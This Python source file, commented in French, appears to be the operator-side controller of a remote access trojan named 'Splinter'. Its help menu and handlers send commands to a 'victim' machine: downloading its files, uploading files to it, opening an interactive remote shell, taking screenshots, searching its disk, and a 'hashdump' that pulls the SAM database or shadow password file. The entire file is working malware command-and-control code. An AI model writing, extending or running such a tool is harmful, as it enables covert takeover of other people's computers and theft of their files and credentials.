import os
import base64
from colorama import Fore, Style, init

# Initialisation de Colorama
init(autoreset=True)

def colorama_etoile():
    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "*" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "

def colorama_plus():
    return Fore.RED + Style.DIM + "[" + Style.RESET_ALL + Fore.GREEN + Style.DIM + "+" + Style.RESET_ALL + Fore.RED + Style.DIM + "] "

def get_unique_filename(directory, base_filename, extension):
    count = 1
    while True:
        filename = f"{base_filename}{'(' + str(count) + ')' if count > 1 else ''}{extension}"
        full_path = os.path.join(directory, filename)
        if not os.path.exists(full_path):
            return filename
        count += 1

def help_menu():
    help_text = print(f"""{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}                                        _   _      _       
                                       | | | | ___| |_ __  
                                       | |_| |/ _ \ | '_ \ 
                                       |  _  |  __/ | |_) |
                                       |_| |_|\___|_| .__/ 
                                                    |_|    
{Style.RESET_ALL}{Fore.RED}{Style.DIM}
=================================================================================================

Voici la liste des commandes disponible sur {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}Splinter{Style.RESET_ALL}{Fore.RED}{Style.DIM} : 

=================================================================================================
                                                   
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}help{Style.RESET_ALL}{Fore.RED}{Style.DIM} : afficher la liste des commandes disponibles.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}download [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers de la victime vers le serveur.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}upload [chemin]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupération de fichiers du serveur vers la victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}shell{Style.RESET_ALL}{Fore.RED}{Style.DIM} : ouvrir un shell (bash ou cmd) interactif.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}ipconfig{Style.RESET_ALL}{Fore.RED}{Style.DIM} : obtenir la configuration réseau de la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}screenshot{Style.RESET_ALL}{Fore.RED}{Style.DIM} : prendre une capture d'écran de la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}search [mot a rechercher] [chemin de recherche]{Style.RESET_ALL}{Fore.RED}{Style.DIM} : rechercher un fichier sur la machine victime.
{Style.RESET_ALL}{Fore.GREEN}{Style.DIM}hashdump{Style.RESET_ALL}{Fore.RED}{Style.DIM} : récupérer la base SAM ou le fichier shadow de la machine.

=================================================================================================            
                 """)
    return help_text

def download_file(conn, file_path, client_directory):
    conn.sendall(f"download {file_path}".encode())
    file_name = os.path.basename(file_path)
    download_path = os.path.join(client_directory, file_name)

    # Recevoir la taille du fichier
    file_size = int(conn.recv(1024).decode())
    with open(download_path, 'wb') as file:
        remaining = file_size
        while remaining:
            data = conn.recv(1024)
            file.write(data)
            remaining -= len(data)

    print(f"{colorama_plus()}Fichier {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM} téléchargé avec succès depuis le client.")



def upload_file(conn, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            conn.sendall(f"upload {os.path.basename(file_path)}".encode())  # Indication de l'opération
            conn.sendall(str(len(file_data)).encode() + b"\n")  # Taille du fichier
            conn.sendall(file_data)  # Données du fichier
        print(f"{colorama_plus()}Fichier {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{os.path.basename(file_path)}{Style.RESET_ALL}{Fore.RED}{Style.DIM} uploadé avec succès vers le client.")
    except FileNotFoundError:
        print(f"{colorama_plus()}Fichier {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{file_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM} non trouvé.")

def open_shell(conn):
    conn.sendall("shell".encode())
    while True:
        command = input(colorama_etoile() + "Splinter Shell " + Style.RESET_ALL + Fore.GREEN + Style.DIM + "> " + Style.RESET_ALL + Fore.RED + Style.DIM)
        if command.lower() == "exit":
            break
        conn.sendall(command.encode())
        encoded_response = conn.recv(4096)
        response = base64.b64decode(encoded_response).decode('utf-8', errors='ignore')
        print(response)

def get_ipconfig(conn):
    conn.sendall("ipconfig".encode())
    encoded_response = conn.recv(4096)
    response = base64.b64decode(encoded_response).decode('utf-8', errors='ignore')
    print(response)

def take_screenshot(conn, client_directory):
    screenshot_filename = get_unique_filename(client_directory, "screenshot", ".jpg")
    screenshot_path = os.path.join(client_directory, screenshot_filename)
    conn.sendall("screenshot".encode())

    buffer_size = 65536
    end_marker = b"END_OF_SCREENSHOT"
    data_received = bytearray()

    with open(screenshot_path, "wb") as file:
        while True:
            data = conn.recv(buffer_size)
            if end_marker in data:  # Vérifier la présence du marqueur de fin
                data_received += data[:data.find(end_marker)]  # Sauvegarder les données avant le marqueur
                file.write(base64.b64decode(data_received))  # Écrire les données décodées
                break
            else:
                data_received += data  # Accumuler les données reçues

    print(f"{colorama_plus()}Capture d'écran reçue et enregistrée.")


def search_file(conn, search_query, start_path):
    conn.sendall(f"search {search_query} {start_path}".encode())
    data = conn.recv(4096)
    search_results = base64.b64decode(data).decode('utf-8', errors='ignore')
    print(f"{colorama_plus()}Résultats de la recherche dans {start_path} : {search_results}")





def hashdump(conn, client_directory):
    hashdump_dir = os.path.join(client_directory, "hashdump")
    if not os.path.exists(hashdump_dir):
        os.makedirs(hashdump_dir)

    try:
        # Réception du nombre de fichiers
        num_files = int(conn.recv(1024).decode().strip())

        for _ in range(num_files):
            # Réception du nom du fichier et de la taille du fichier encodé
            file_info = conn.recv(1024).decode().strip().split(',')
            file_name, encoded_size = file_info[0], int(file_info[1])
            file_path = os.path.join(hashdump_dir, file_name)

            # Préparation à la réception des données du fichier
        # Préparation à la réception des données du fichier
            received = 0
            with open(file_path, 'wb') as file:
                while received < encoded_size:
                    data = conn.recv(min(encoded_size - received, 4096))
                    if not data:
                        break
                    file.write(base64.b64decode(data))
                    received += len(data)

            print(f"Fichier {file_name} reçu avec succès dans {hashdump_dir}.")

        # Confirmation de la fin de la réception de tous les fichiers
        end_signal = conn.recv(1024).decode().strip()
        if end_signal == "END_OF_HASHDUMP":
            print("Réception de tous les fichiers hashdump terminée.")
        else:
            print(f"Erreur de signal de fin: {end_signal}")

    except Exception as e:
        print(f"Erreur lors de la réception des données hashdump: {e}")













def handle_command(conn, cmd, client_directory):
    try:
        parts = cmd.split(" ")
        if parts[0] == "download":
            if len(parts) != 2:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'download'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}.")
                return
            file_path = parts[1]
            download_file(conn, file_path, client_directory)
        elif cmd.startswith("help"):
            return help_menu()
        elif parts[0] == "upload":
            if len(parts) != 2:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'upload'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}.")
                return
            file_path = parts[1]
            upload_file(conn, file_path)
        elif cmd.startswith("shell"):
            open_shell(conn)
        elif cmd.startswith("ipconfig"):
            get_ipconfig(conn)
        elif cmd.startswith("screenshot"):
            take_screenshot(conn, client_directory)
        elif parts[0] == "search":
            if len(parts) < 3:
                print(f"Commande {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'search'{Style.RESET_ALL}{Fore.RED}{Style.DIM} incomplète ou incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM}.")
                return
            search_query = parts[1]
            start_path = ' '.join(parts[2:])
            conn.sendall(f"search {search_query} {start_path}".encode())
            search_results = ""
            print(f"{colorama_plus()}La recherche peut prendre plusieurs secondes")
            while True:
                data = conn.recv(4096)
                if base64.b64decode(data) == b"END_OF_SEARCH":
                    break
                search_results += base64.b64decode(data).decode('utf-8', errors='ignore')
            print(f"{colorama_plus()}Résultats de la recherche dans {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}{start_path}{Style.RESET_ALL}{Fore.RED}{Style.DIM} : \n\n{search_results}\n")
        elif cmd.startswith("hashdump"):
            print("[DEBUG - Serveur] Exécution de la commande hashdump")
            hashdump(conn, client_directory)
        else:
            print(f"{colorama_etoile()}Commande non reconnue.")
    except ValueError:
        print(f"Commande incorrecte. Utiliser {Style.RESET_ALL}{Fore.GREEN}{Style.DIM}'help'{Style.RESET_ALL}{Fore.RED}{Style.DIM} pour savoir comment utiliser la commande.")       
